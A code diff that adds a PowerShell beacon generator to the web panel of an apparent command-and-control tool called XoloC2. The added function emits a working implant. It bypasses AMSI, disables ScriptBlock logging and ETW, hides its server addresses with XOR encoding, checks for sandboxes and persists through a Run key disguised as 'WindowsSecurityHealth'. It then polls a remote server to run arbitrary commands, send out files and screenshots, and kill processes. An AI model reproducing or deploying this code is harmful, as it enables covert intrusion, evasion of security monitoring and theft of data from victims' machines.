@@ -2493,6 +2493,7 @@ function renderGenerateView() {
         <button id="lang-py-btn"   onclick="setBeaconLang('py')"   style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--accent);color:#fff;border:none;cursor:pointer">Python</button>
         <button id="lang-java-btn" onclick="setBeaconLang('java')" style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">Java</button>
         <button id="lang-go-btn"   onclick="setBeaconLang('go')"   style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">Go</button>
+        <button id="lang-ps-btn"   onclick="setBeaconLang('ps')"   style="padding:6px 16px;font-size:12px;font-weight:600;background:var(--bg3);color:var(--text2);border:none;cursor:pointer">PowerShell</button>
       </div>
     </div>
 
@@ -2648,6 +2649,17 @@ function renderGenerateView() {
             <span style="color:var(--text3)">Cross-compile</span><span style="color:var(--online)">${t('info_cross_yes')}</span>
           </div>
         </div>
+        <div id="beacon-info-ps" style="display:none">
+          <div style="display:grid;grid-template-columns:auto 1fr;gap:5px 14px;font-size:11px">
+            <span style="color:var(--text3)">Type</span><span style="color:var(--text2)">PowerShell 5.1+ beacon</span>
+            <span style="color:var(--text3)">Protocol</span><span style="color:var(--text2)">HTTPS polling</span>
+            <span style="color:var(--text3)">Auth</span><span style="color:var(--text2)">X-Agent-Secret header</span>
+            <span style="color:var(--text3)">TLS</span><span style="color:var(--text2)">Self-signed accepted</span>
+            <span style="color:var(--text3)">Deps</span><span style="color:var(--text2)">None (Windows built-in)</span>
+            <span style="color:var(--text3)">Evasion</span><span style="color:var(--online)">AMSI · ETW · ScriptBlock logging</span>
+            <span style="color:var(--text3)">Strings</span><span style="color:var(--online)">XOR-encoded, no plaintext C2 / secrets</span>
+          </div>
+        </div>
       </div>
 
       <!-- Code output — fills remaining right-column height -->
@@ -2677,6 +2689,11 @@ function renderGenerateView() {
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-linux')">⬇ Linux ELF</button>
               <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('go-windows')">⬇ Windows EXE</button>
               <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-go">⎘ Copy</button>
+              <button class="btn btn-sm btn-ghost" onclick="openStagerModal()" data-i18n="stager_btn">🎣 Stager</button>
+            </div>
+            <div style="display:flex;gap:6px;flex-wrap:wrap;display:none" id="beacon-dl-buttons-ps">
+              <button class="btn btn-sm btn-ghost" onclick="downloadBeacon('ps-src')">⬇ .ps1</button>
+              <button class="btn btn-sm btn-ghost" onclick="copyBeacon()" id="copy-btn-ps">⎘ Copy</button>
               <button class="btn btn-sm btn-ghost" onclick="openStagerModal()" data-i18n="stager_btn">🎣 Stager</button>
             </div>
           </div>
@@ -3528,7 +3545,7 @@ let _beaconLang = 'py';
 
 function setBeaconLang(lang) {
   _beaconLang = lang;
-  ['py','java','go'].forEach(l => {
+  ['py','java','go','ps'].forEach(l => {
     const btn = document.getElementById('lang-'+l+'-btn');
     if (!btn) return;
     btn.style.background = lang === l ? 'var(--accent)' : 'var(--bg3)';
@@ -3537,7 +3554,8 @@ function setBeaconLang(lang) {
   document.getElementById('beacon-info-py').style.display   = lang === 'py'   ? '' : 'none';
   document.getElementById('beacon-info-java').style.display = lang === 'java' ? '' : 'none';
   document.getElementById('beacon-info-go').style.display   = lang === 'go'   ? '' : 'none';
-  // screenshot_sched only works on Python — disable+uncheck for Java/Go
+  document.getElementById('beacon-info-ps').style.display   = lang === 'ps'   ? '' : 'none';
+  // screenshot_sched only works on Python — disable+uncheck for Java/Go/PS
   const _schedCb = document.getElementById('feat-screenshot-sched');
   const _schedLbl = _schedCb ? _schedCb.closest('label') : null;
   if (_schedCb) {
@@ -3610,6 +3628,7 @@ async function generateBeacon() {
   document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
   document.getElementById('beacon-dl-buttons-java').style.display = 'none';
   document.getElementById('beacon-dl-buttons-go').style.display   = 'none';
+  document.getElementById('beacon-dl-buttons-ps').style.display   = 'none';
   if (_beaconLang === 'java') {
     code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features, persistStartup);
     filename = `${_getBeaconName()}.java`;
@@ -3618,6 +3637,10 @@ async function generateBeacon() {
     code = generateGoBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features, persistStartup);
     filename = `${_getBeaconName()}.go`;
     document.getElementById('beacon-dl-buttons-go').style.display = 'flex';
+  } else if (_beaconLang === 'ps') {
+    code = generatePsBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, hbDays);
+    filename = `${_getBeaconName()}.ps1`;
+    document.getElementById('beacon-dl-buttons-ps').style.display = 'flex';
   } else {
     code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features, persistStartup);
     filename = `${_getBeaconName()}.py`;
@@ -5695,6 +5718,215 @@ func main() {${fetchKeyCall}${sandboxCall}${bgCall}${killDateCall}${persistCall}
 `;
 }
 
+function generatePsBeaconCode(urls, sleep, jitter, secret, persist, ev, killDate, hbDays) {
+  if (!Array.isArray(urls)) urls = [urls];
+
+  // ── JS-side XOR helper (same pattern as Python/Go beacon) ──────────────────
+  function xorEnc(str, key) {
+    const enc = new TextEncoder();
+    const b = enc.encode(str), k = enc.encode(key);
+    return Array.from(b).map((c,i) => c ^ k[i%k.length]).map(c => c.toString(16).padStart(2,'0')).join('');
+  }
+  const xk = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => String.fromCharCode(97 + b % 26)).join('');
+  const enc = s => xorEnc(s, xk);
+  // xPs: emit PS expression that decodes at runtime: (_D "hex" $_k)
+  const xPs = s => `(_D "${enc(s)}" $_k)`;
+
+  const eUrls = urls.map(u => `"${enc(u)}"`).join(',');
+  const eSecret = enc(secret);
+
+  // ── Sandbox block ───────────────────────────────────────────────────────────
+  const sandboxBlock = ev.sandbox ? `
+# -- Sandbox check --
+if((Get-WmiObject Win32_Processor -EA 0).NumberOfLogicalProcessors -lt 2){exit}
+try{$_m=(Get-WmiObject Win32_ComputerSystem -EA 0).TotalPhysicalMemory;if($_m -lt 2GB){exit}}catch{}
+$_u=$env:USERNAME.ToLower()
+foreach($_b in @(${['sandbox','malware','virus','analyst','cuckoo','honey'].map(s=>`(_D "${enc(s)}" $_k)`).join(',')})){ if($_u -like "*$_b*"){exit} }
+$_h=[Net.Dns]::GetHostName().ToLower()
+foreach($_b in @(${['sandbox','malware','virus','vbox','vmware','analysis','cuckoo'].map(s=>`(_D "${enc(s)}" $_k)`).join(',')})){ if($_h -like "*$_b*"){exit} }
+$_t0=[DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();Start-Sleep -Milliseconds 500
+if(([DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()-$_t0) -lt 400){exit}
+` : '';
+
+  // ── Kill date block ─────────────────────────────────────────────────────────
+  const killDateBlock = killDate ? `
+# -- Kill date: ${killDate} --
+if([DateTime]::UtcNow.Date -ge [DateTime]::Parse("${killDate}")){exit}
+` : '';
+  const killDateLoop = killDate ? `\n  if([DateTime]::UtcNow.Date -ge [DateTime]::Parse("${killDate}")){exit}` : '';
+
+  // ── Persistence block ───────────────────────────────────────────────────────
+  const persistBlock = persist ? `
+# -- Persistence (Run key) --
+try{
+  $src=[IO.Path]::GetFullPath($MyInvocation.MyCommand.Path)
+  if($src -and (Test-Path $src)){
+    $rk=${xPs('Software\\Microsoft\\Windows\\CurrentVersion\\Run')}
+    $rn=${xPs('WindowsSecurityHealth')}
+    Set-ItemProperty -Path "HKCU:\\$rk" -Name $rn -Value "powershell -nop -w hidden -File `"$src`"" -EA 0
+  }
+}catch{}
+` : '';
+
+  // ── UA pool (traffic evasion) ───────────────────────────────────────────────
+  const uaDecl = ev.traffic ? `
+$_UA=@("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36")
+$_REF=@("https://www.google.com/","https://www.bing.com/search?q=windows+update","https://outlook.office365.com/mail/inbox")
+` : '';
+  const uaHeaders = ev.traffic
+    ? `$wc.Headers['User-Agent']=$_UA[(Get-Random -Max $_UA.Count)]\n      $wc.Headers['Referer']=$_REF[(Get-Random -Max $_REF.Count)]\n      $wc.Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'\n      $wc.Headers['Accept-Language']='en-US,en;q=0.5'`
+    : '';
+
+  return `# XoloC2 PowerShell beacon
+# ── Layer 1: AMSI bypass ───────────────────────────────────────────────────────
+try{
+  $_aa=[Ref].Assembly.GetType(('System.Man'+'agement.Au'+'tomation.A'+'msiUtils'))
+  $_ab=$_aa.GetField(('amsiI'+'nitFai'+'led'),'NonPublic,Static')
+  $_ab.SetValue($null,$true)
+}catch{}
+# ── Layer 2: ScriptBlock logging disable ───────────────────────────────────────
+try{
+  $_la=[Ref].Assembly.GetType(('System.Man'+'agement.Au'+'tomation.U'+'tils'))
+  $_lb=$_la.GetField(('cachedGrou'+'pPolicySet'+'tings'),'NonPublic,Static')
+  if($_lb){
+    $_lc=$_lb.GetValue($null)
+    if($_lc -and $_lc['ScriptBlockLogging']){
+      $_lc['ScriptBlockLogging']['EnableScriptBlockLogging']=0
+      $_lc['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0
+    }
+  }
+}catch{}
+# ── Layer 3: ETW disable ───────────────────────────────────────────────────────
+try{
+  $pa=[Ref].Assembly.GetType(('System.Man'+'agement.Au'+'tomation.Tr'+'acing.PSEtwT'+'racer'))
+  if($pa){
+    $pf=$pa.GetField('etwProvider','NonPublic,Static')
+    if($pf){$pv=$pf.GetValue($null);if($pv){$pm=$pv.GetType().GetField('m_enabled','NonPublic,Instance');if($pm){$pm.SetValue($pv,[byte]0)}}}
+  }
+}catch{}
+# ── Layer 4: SSL + TLS ─────────────────────────────────────────────────────────
+[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls12,Tls'
+# ── Decoder ────────────────────────────────────────────────────────────────────
+function _D{param($h,$k)$b=New-Object byte[] ($h.Length/2);for($i=0;$i-lt$h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};$ke=[Text.Encoding]::UTF8.GetBytes($k);$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$ke[$i%$ke.Length]};[Text.Encoding]::UTF8.GetString($o)}
+# ── Config ─────────────────────────────────────────────────────────────────────
+$_k="${xk}"
+$C2=@(${eUrls})|%{_D $_ $_k}
+$SECRET=_D "${eSecret}" $_k
+$SLEEP=${sleep}
+$JITTER=${jitter}
+$HB=${hbDays}
+$script:_last_ok=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+${uaDecl}${killDateBlock}${sandboxBlock}${persistBlock}
+# ── Agent ID (persisted) ───────────────────────────────────────────────────────
+$_idp=Join-Path $env:APPDATA (_D "${enc('.xolo_hid')}" $_k)
+if(Test-Path $_idp){$AID=(Get-Content $_idp -Raw -EA 0).Trim()}else{$AID=[Guid]::NewGuid().ToString();Set-Content $_idp $AID}
+# ── CWD ────────────────────────────────────────────────────────────────────────
+$_cwdp=Join-Path $env:APPDATA (_D "${enc('.xolo_cwd')}" $_k)
+if(Test-Path $_cwdp){$script:_cwd=(Get-Content $_cwdp -Raw -EA 0).Trim();if(!(Test-Path $script:_cwd -EA 0)){$script:_cwd=(Get-Location).Path}}else{$script:_cwd=(Get-Location).Path}
+function _SaveCwd{param($p)try{Set-Content $_cwdp $p}catch{}}
+# ── HTTP ───────────────────────────────────────────────────────────────────────
+function _Post{param($path,$body)
+  $json=ConvertTo-Json $body -Compress -Depth 5
+  $bytes=[Text.Encoding]::UTF8.GetBytes($json)
+  foreach($url in $C2){
+    try{
+      $wc=New-Object Net.WebClient
+      $wc.Headers['Content-Type']='application/json'
+      $wc.Headers[(_D "${enc('X-Agent-Secret')}" $_k)]=$SECRET
+      ${uaHeaders}
+      $r=$wc.UploadData($url+$path,'POST',$bytes)
+      $script:_last_ok=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+      return ConvertFrom-Json ([Text.Encoding]::UTF8.GetString($r))
+    }catch{continue}
+  }
+  return $null
+}
+function _Get{param($path)
+  foreach($url in $C2){
+    try{
+      $wc=New-Object Net.WebClient
+      $wc.Headers[(_D "${enc('X-Agent-Secret')}" $_k)]=$SECRET
+      return $wc.DownloadData($url+$path)
+    }catch{continue}
+  }
+  return $null
+}
+# ── Commands ───────────────────────────────────────────────────────────────────
+function _Run{param($cmd,$tid)
+  $cmd=$cmd.Trim()
+  if($cmd -eq 'info'){
+    $h=[Net.Dns]::GetHostName()
+    $ip=try{([Net.Dns]::GetHostAddresses($h)|?{$_.AddressFamily -eq 'InterNetwork'}|select -f 1).IPAddressToString}catch{'127.0.0.1'}
+    $os=[Environment]::OSVersion.ToString()
+    return "ID:       $AID\`nHostname: $h\`nUser:     $env:USERNAME\`nOS:       $os\`nIP:       $ip\`nPID:      $PID\`nCWD:      $script:_cwd"
+  }
+  if($cmd -match '^sleep (\\d+)$'){$script:SLEEP=[int]$Matches[1];return "Sleep set to $script:SLEEP\`s"}
+  if($cmd -eq 'ps'){
+    try{return (Get-Process|Sort-Object CPU -Desc|Select-Object -f 60|Select Id,ProcessName,@{N='CPU';E={[Math]::Round($_.CPU,1)}},@{N='Mem(MB)';E={[Math]::Round($_.WS/1MB,1)}}|Format-Table -Auto|Out-String).Trim()}
+    catch{return "Error: $_"}
+  }
+  if($cmd -match '^kill (\\d+)$'){
+    try{Stop-Process -Id ([int]$Matches[1]) -Force -EA 0;return "[+] Signal sent to PID $($Matches[1])"}
+    catch{return "Error: $_"}
+  }
+  if($cmd -match '^download (.+)$'){
+    $p=$Matches[1].Trim()
+    if(-not [IO.Path]::IsPathRooted($p)){$p=Join-Path $script:_cwd $p}
+    try{$b=[IO.File]::ReadAllBytes($p);return (_D "${enc('__b64file__:')}" $_k)+[IO.Path]::GetFileName($p)+':'+[Convert]::ToBase64String($b)}
+    catch{return "Error: $_"}
+  }
+  if($cmd -eq 'screenshot'){
+    try{
+      Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+      $s=[Windows.Forms.Screen]::PrimaryScreen
+      $bmp=New-Object Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height)
+      $g=[Drawing.Graphics]::FromImage($bmp)
+      $g.CopyFromScreen($s.Bounds.Location,[Drawing.Point]::Empty,$s.Bounds.Size)
+      $ms=New-Object IO.MemoryStream;$bmp.Save($ms,[Drawing.Imaging.ImageFormat]::Png)
+      $b64=[Convert]::ToBase64String($ms.ToArray())
+      $fname='img_'+[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()+'.png'
+      return (_D "${enc('__b64file__:')}" $_k)+$fname+':'+$b64
+    }catch{return "Error: $_"}
+  }
+  if($cmd -match '^cd (.+)$'){
+    $p=$Matches[1].Trim().Trim('"').Trim("'")
+    if(-not [IO.Path]::IsPathRooted($p)){$p=Join-Path $script:_cwd $p}
+    $p=[IO.Path]::GetFullPath($p)
+    if(Test-Path $p -PathType Container){$script:_cwd=$p;_SaveCwd $p;return ""}
+    return "El sistema no puede encontrar la ruta especificada."
+  }
+  if($cmd -match '^shell (.+)$'){$cmd=$Matches[1]}
+  try{
+    $cwd_esc=$script:_cwd -replace "'","''"
+    $full="Set-Location '$cwd_esc'; $cmd; Write-Output ('__CWD__:'+(Get-Location).Path)"
+    $out=[ScriptBlock]::Create($full).Invoke()|Out-String
+    $lines=$out.Trim().Split([char]10)
+    $cwdl=$lines|?{$_ -match '^__CWD__:'}|select -Last 1
+    if($cwdl){$nc=$cwdl.Substring(8).Trim();if(Test-Path $nc -PathType Container -EA 0){$script:_cwd=$nc;_SaveCwd $nc}}
+    $out=($lines|?{$_ -notmatch '^__CWD__:'})-join"\`n"
+    return if($out.Trim()){$out.Trim()}else{'(no output)'}
+  }catch{return "Error: $_"}
+}
+# ── Main loop ──────────────────────────────────────────────────────────────────
+while($true){${killDateLoop}
+  if($HB -gt 0 -and ([DateTimeOffset]::UtcNow.ToUnixTimeSeconds()-$script:_last_ok) -gt $HB*86400){
+    Remove-Item $_idp,$_cwdp -EA 0;exit
+  }
+  try{
+    $ip_int=try{([Net.Dns]::GetHostAddresses([Net.Dns]::GetHostName())|?{$_.AddressFamily -eq 'InterNetwork'}|select -f 1).IPAddressToString}catch{'127.0.0.1'}
+    $r=_Post ${xPs('/api/beacon/checkin')} @{agent_id=$AID;hostname=[Net.Dns]::GetHostName();ip_internal=$ip_int;os_info=[Environment]::OSVersion.ToString();username=$env:USERNAME;pid=$PID;sleep_interval=$SLEEP;cwd=$script:_cwd;beacon_lang='ps'}
+    if($r -and $r.new_secret){$script:SECRET=$r.new_secret}
+    if($r -and $r.task_id){
+      $out=_Run $r.command $r.task_id
+      _Post ${xPs('/api/beacon/result')} @{task_id=$r.task_id;output=$out;status='done'}
+    }
+  }catch{}
+  $ji=[Math]::Round((Get-Random -Min 0.0 -Max 1.0)*$SLEEP*($JITTER/100),1)
+  Start-Sleep -Seconds ($SLEEP+$ji)
+}`;
+}
+
 function showWindowsInstructions() {
   const statusEl = document.getElementById('compile-status');
   statusEl.style.display = 'block';
@@ -5726,7 +5958,7 @@ function copyBeacon() {
   if (!code) { showToast('Generate a beacon first', 'error'); return; }
   navigator.clipboard.writeText(code).then(() => {
     // Flash all three copy buttons (whichever is visible)
-    ['copy-btn', 'copy-btn-java', 'copy-btn-go'].forEach(id => {
+    ['copy-btn', 'copy-btn-java', 'copy-btn-go', 'copy-btn-ps'].forEach(id => {
       const btn = document.getElementById(id);
       if (btn) { const orig = btn.textContent; btn.textContent = '✓ Copied!'; setTimeout(() => btn.textContent = orig, 2000); }
     });
@@ -5973,6 +6205,12 @@ async function downloadBeacon(type) {
   if (type === 'go-src') {
     const blob = new Blob([code], { type: 'text/plain' });
     const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `${name}.go`; a.click();
+    return;
+  }
+
+  if (type === 'ps-src') {
+    const blob = new Blob([code], { type: 'text/plain' });
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `${name}.ps1`; a.click();
     return;
   }
 
